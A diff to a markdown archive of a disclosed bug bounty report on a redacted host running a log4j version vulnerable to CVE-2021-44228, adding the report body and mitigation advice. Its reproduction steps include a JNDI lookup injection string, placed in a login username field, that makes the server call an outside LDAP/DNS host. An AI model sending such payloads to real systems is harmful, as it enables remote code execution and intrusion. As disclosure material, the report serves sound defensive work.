@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "Use of Externally-Controlled Format String"
 enriched: true
+body: true
 date: 2022-01-19
 submitted: 2021-12-11T00:16:38.725Z
 bounty_usd: null
@@ -25,6 +26,38 @@ title: "██████████ running a vulnerable log4j"
 - Report: [https://hackerone.com/reports/1423496](https://hackerone.com/reports/1423496)
 - CWE: Use of Externally-Controlled Format String | CVE: CVE-2021-44228
 - Submitted: 2021-12-11T00:16:38.725Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+**Description:**
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
+
+## Impact
+
+Probably arbitrary code execution
+
+## System Host(s)
+████████
+
+## Affected Product(s) and Version(s)
+
+
+## CVE Numbers
+CVE-2021-44228
+
+## Steps to Reproduce
+1. Browse to https://████████/███████https%3A%2F%2F█████████%2F
+2. Enter a `${jndi:ldap://dns-server-yoi-control/a}` into the username field
+3. Enter a random password
+4. Submit
+
+Observe that a request was made to your DNS server. This strongly suggests a vulnerable log4j.
+
+## Suggested Mitigation/Remediation Actions
+Update log4j or disable jndi support.
 
 ## Timeline
 
